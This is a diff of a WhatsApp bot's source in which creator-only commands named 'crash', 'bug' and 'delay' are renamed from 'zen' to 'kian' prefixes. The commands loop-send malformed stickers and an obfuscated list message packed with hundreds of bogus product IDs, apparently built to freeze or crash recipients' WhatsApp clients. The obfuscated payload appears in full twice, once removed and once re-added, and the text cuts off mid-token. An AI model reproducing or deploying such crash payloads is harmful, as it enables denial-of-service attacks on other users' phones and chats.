@@ -1036,12 +1023,12 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case 'zenbug5': case 'zencrash4': case 'crashar14': {
+case 'kianbug5': case 'kiancrash4': case 'crashar14': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "stickerMessage": {
@@ -1060,12 +1047,12 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
-case 'zenbug6': case 'zencrash5': case 'crashar15':{
+case 'kianbug6': case 'kiancrash5': case 'crashar15':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
 var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "stickerMessage": {
@@ -1085,24 +1072,24 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 break
 
-case 'zendelay': {
+case 'kiandelay': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku zenu`
+ydd = `Hallo Aku kian`
 for (let i = 0; i < jumlah; i++) {
-var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','184726183721626','1847261837216262','PRODUCT_LIST','184726183721626282','7007318245952499','18472618372162628','1847261837216262829','1847261837216262824','8606787pjRFfV','6ohjUEo','18472618372162627','2DjJTeF','10eBrCRT','message','1860208OrcNUm','1303771sMeUPs','1596925gyTSrQ','1847261837216269','HAIKAL','18561433JSLMJl','key','2624412LNDEmX','16vCdaCM'];_0x3b16=function(){return _0x4c72fa;};return _0x3b16();}(function(_0x5e9cd5,_0x1d7d08){var _0x1a0e50=_0x4b8f,_0x1f94ff=_0x5e9cd5();while(!![]){try{var _0x25dc7c=parseInt(_0x1a0e50(0x19a))/0x1+-parseInt(_0x1a0e50(0x196))/0x2*(parseInt(_0x1a0e50(0x1a0))/0x3)+parseInt(_0x1a0e50(0x1a1))/0x4*(-parseInt(_0x1a0e50(0x19b))/0x5)+-parseInt(_0x1a0e50(0x194))/0x6*(-parseInt(_0x1a0e50(0x193))/0x7)+-parseInt(_0x1a0e50(0x199))/0x8+-parseInt(_0x1a0e50(0x1a3))/0x9+-parseInt(_0x1a0e50(0x197))/0xa*(-parseInt(_0x1a0e50(0x19e))/0xb);if(_0x25dc7c===_0x1d7d08)break;else _0x1f94ff['push'](_0x1f94ff['shift']());}catch(_0xcc3c8f){_0x1f94ff['push'](_0x1f94ff['shift']());}}}(_0x3b16,0xb2901));var bugshinchan=generateWAMessageFromContent(m['chat'],proto['Message']['fromObject']({'listMessage':{'title':''+buttonkal,'description':'ZENU\x20AIZAK\x20BOYS'+buttonkal,'buttonText':_0x39080c(0x19d),'listType':_0x39080c(0x18d),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262244'},{'productId':'184726183721626282'},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x39080c(0x18f)},'businessOwnerJid':'6289514100332@s.whatsapp.net'},'footerText':''+buttonkal}}),{'userJid':m[_0x39080c(0x1a2)],'quoted':m});function _0x4b8f(_0x635405,_0x57e435){var _0x3b16d7=_0x3b16();return _0x4b8f=function(_0x4b8f78,_0x305957){_0x4b8f78=_0x4b8f78-0x18d;var _0x3baff1=_0x3b16d7[_0x4b8f78];return _0x3baff1;},_0x4b8f(_0x635405,_0x57e435);}haikal['relayMessage'](m[_0x39080c(0x1a2)],bugshinchan[_0x39080c(0x198)],{'messageId':bugshinchan[_0x39080c(0x19f)]['id']});
+var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','184726183721626','1847261837216262','PRODUCT_LIST','184726183721626282','7007318245952499','18472618372162628','1847261837216262829','1847261837216262824','8606787pjRFfV','6ohjUEo','18472618372162627','2DjJTeF','10eBrCRT','message','1860208OrcNUm','1303771sMeUPs','1596925gyTSrQ','1847261837216269','HAIKAL','18561433JSLMJl','key','2624412LNDEmX','16vCdaCM'];_0x3b16=function(){return _0x4c72fa;};return _0x3b16();}(function(_0x5e9cd5,_0x1d7d08){var _0x1a0e50=_0x4b8f,_0x1f94ff=_0x5e9cd5();while(!![]){try{var _0x25dc7c=parseInt(_0x1a0e50(0x19a))/0x1+-parseInt(_0x1a0e50(0x196))/0x2*(parseInt(_0x1a0e50(0x1a0))/0x3)+parseInt(_0x1a0e50(0x1a1))/0x4*(-parseInt(_0x1a0e50(0x19b))/0x5)+-parseInt(_0x1a0e50(0x194))/0x6*(-parseInt(_0x1a0e50(0x193))/0x7)+-parseInt(_0x1a0e50(0x199))/0x8+-parseInt(_0x1a0e50(0x1a3))/0x9+-parseInt(_0x1a0e50(0x197))/0xa*(-parseInt(_0x1a0e50(0x19e))/0xb);if(_0x25dc7c===_0x1d7d08)break;else _0x1f94ff['push'](_0x1f94ff['shift']());}catch(_0xcc3c8f){_0x1f94ff['push'](_0x1f94ff['shift']());}}}(_0x3b16,0xb2901));var bugshinchan=generateWAMessageFromContent(m['chat'],proto['Message']['fromObject']({'listMessage':{'title':''+buttonkal,'description':'kian\x20AIZAK\x20BOYS'+buttonkal,'buttonText':_0x39080c(0x19d),'listType':_0x39080c(0x18d),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262244'},{'productId':'184726183721626282'},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080